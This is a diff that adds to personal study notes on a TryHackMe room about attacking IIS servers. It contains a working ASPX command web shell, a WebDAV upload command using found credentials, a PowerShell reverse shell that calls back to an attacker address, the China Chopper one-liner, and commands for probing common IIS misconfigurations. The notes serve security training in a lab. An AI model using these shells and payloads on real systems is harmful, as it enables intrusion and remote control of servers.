@@ -4,7 +4,10 @@ https://tryhackme.com/room/webserverattacks2
 - [[#IIS]]
 - [[#Fingerprinting & Enumeration]]
 - [[#~Tilde Enumeration]]
-- 
+- [[#WebDAV Exploitation -- ASPX Shell]]
+- [[#ASPX Web Shells]]
+- [[#IIS Misconfigurations]]
+- [[#Automation -- NSE]]
 
 ___
 ### IIS
@@ -121,26 +124,160 @@ IIS doesn't serve content via short name URL path directly --> try to guess long
 `webdav_user:P@ssw0rd!123`
 
 ___
-### 
+### WebDAV Exploitation -- ASPX Shell
 [[#Table of contents|Back to the top]]
 
+In [[#Testing File Uploading & Execution]], `PUT` returned `401` meaning no writing permission
+In [[#~Tilde Enumeration]], we found credentials which could give us writing permission
 
+Success conditions
+- **WebDAV** enabled
+- Valid **credentials** with **Write** permission
+- **Script Execute** is set, IIS passes **`.aspx`** request to ASP.NET handler, doesn't serve them as static content
+
+`cmd.aspx`
+```aspx
+<​%@ Page Language="C#" %​> <​% string cmd = Request.QueryString["cmd"]; if (!string.IsNullOrEmpty(cmd)) { var proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c " + cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>"); } %​>
+```
+*accepts `cmd` parameter, runs it through `cmd.exe`, returns output*
+
+Anonymous, unauthenticated users only have read permission (`GET`) --> authenticate
+
+```Shell
+curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.130.167.138/webdav/cmd.aspx
+```
+*`PUT` `cmd.aspx` directly inside `/webdav` directory*
+*`--ntlm` flag is used for authentication ([[NTLM]])*
+
+`curl "http://10.130.167.138/webdav/cmd.aspx?cmd=whoami"`
 
 ___
-### 
+### ASPX Web Shells
 [[#Table of contents|Back to the top]]
 
+ASPX web shell: ASP.NET file hosted on web server which accepts attacker input via HTTP and executes it under server process
 
+Code is executed inside `w3wp.exe` (IIS worker process), runs under Application Pool identity
+Application Pool determines what shell can do
+`ApplicationPoolIdentity` (IIS 7.5+ default) limited system access but inherits `SeImpersonatePrivilege`
+Domain Admin / `SYSTEM` --> high privilege
+
+##### 1. Execute Commands
+
+```Shell
+curl "http://10.130.167.138/webdav/cmd.aspx?cmd=whoami"
+```
+
+Returns `<pre>iis apppool\defaultapppool </pre>`
+--> app is running under Application Pool identity
+
+```Shell
+curl "http://10.130.167.138/webdav/cmd.aspx?cmd=hostname"
+curl "http://10.130.167.138/webdav/cmd.aspx?cmd=ipconfig"
+curl "http://10.130.167.138/webdav/cmd.aspx?cmd=dir+C:\\"
+```
+
+##### 2. Escalate to Reverse Shell
+
+Start Netcat on attacker machine
+```Shell
+nc -lvnp 443
+```
+NB: `443` is HTTPS port, outbound HTTPS traffic almost never blocked by enterprise firewalls
+
+PS reverse shell
+```Powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -c ` "$client = New-Object System.Net.Sockets.TCPClient('{10.130.116.123}',443);` $stream = $client.GetStream();` [byte[]]$bytes = 0..65535|%{0};` while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){` $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);` $sendback = (iex $data 2>&1 | Out-String );` $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';` $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);` $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};` $client.Close()""
+```
+
+Pass it through ASPX shell
+```Shell
+curl -G "http://10.130.167.138/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.130.116.123'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+```
+
+##### 3. Confirm Privileges
+
+`whoami`, `whoami /priv`
+--> `SeImpersonatePrivilege`: allows process to impersonate any user who connects to it at Windows token level
+
+Potato-style tools: force SYSTEM-level process to authenticate to attacker-controlled named pipe, use `SeImpersonatePrivilege` to steal SYSTEM token from that authentication
+
+##### Real-World ASPX Shell -- China Chopper
+
+```ASP.NET
+<​%@ Page Language="Jscript"%​><​%eval(Request.Item["chopper"],"unsafe");%​>
+```
+
+Defenders should look for 73 bytes and `eval(` pattern
 
 ___
-### 
+### IIS Misconfigurations
 [[#Table of contents|Back to the top]]
 
+Most common IIS attack surface
 
+##### 1. Directory Listing Enabled
+No `index.html`/`default.aspx`, `Directory Browsing` enabled --> IIS renders file listing
+`curl http://10.130.167.138/uploads/`
+Priority targets: `.bak`, `.config`, `.log`, `.zip`, `.sql` (shouldn't be publicly available)
+
+##### 2. Unauthenticated HTTP PUT & DELETE
+`curl -X OPTIONS http://10.130.167.138/ -sv 2>&1 | grep "Allow:"`
+
+##### 3. Exposed `web.config`
+Contains database connection strings, API keys, SMTP credentials, encryption keys, application settings
+`curl http://10.130.167.138/web.config`
+
+##### 4. Verbose Error Messages
+Development mode IIS returns full .NET stack traces (internal file paths, .NET framework version, failed database query, server's internal IP, ...)
+--> going live --> in `web.config`,
+```XML
+<system.web>
+	<customErrors mode="On" />
+</system.web>
+```
+--> generic error page
+
+##### 5. Enabled `trace.axd`
+Built-in diagnostic handler, can include HTTP headers, form values, session state, cookies, internal timing data for every recent request to application
+`curl http://10.130.167.138/trace.axd`
+Should be disabled in `web.config`: `<trace enabled="false"/>`
+`200` is already a finding
+
+##### 6. Enabled TRACE Method
+HTTP method, echoes incoming request back
+`curl -X TRACE http://10.130.167.138 -sv`
+`200` is already a finding
+
+##### 7. Application Pool Running as Privileged Account
+`curl "http://10.130.167.138/webdav/cmd.aspx?cmd=whoami"`
+--> `nt authority\system` / domain admin username
 
 ___
-### 
+### Automation -- NSE
 [[#Table of contents|Back to the top]]
+
+Nmap Scripting Engine
+
+##### 1. Service Version Detection
+`nmap -sV -p 80 10.130.167.138`
+
+##### 2. HTTP Methods Enumeration
+`nmap --script http-methods -p 80 10.130.167.138`
+
+##### 3. WebDAV Detection
+`nmap --script http-webdav-scan -p 80 10.130.167.138`
+Confirmed by WebDAV-specific verbs in `Public Options` line (`PROPFIND`, `PROPPATCH`, `MKCOL`, `COPY`, `MOVE`, `LOCK`, `UNLOCK`)
+
+##### 4. Authentication Requirements
+`nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.130.167.138`
+
+|Script|What It Does|
+|---|---|
+|`http-methods`|Sends an OPTIONS request and parses the `Allow:` header to list permitted methods|
+|`http-webdav-scan`|Probes for WebDAV support and retrieves the server's DAV headers|
+|`http-iis-webdav-vuln`|Tests for IIS WebDAV authentication bypass (CVE-2009-1535, affects IIS 5 and 6)|
+|`http-ntlm-info`|Sends an `NTLM` authentication request to a given path and extracts target information from the NTLM challenge response.|
 
 
 
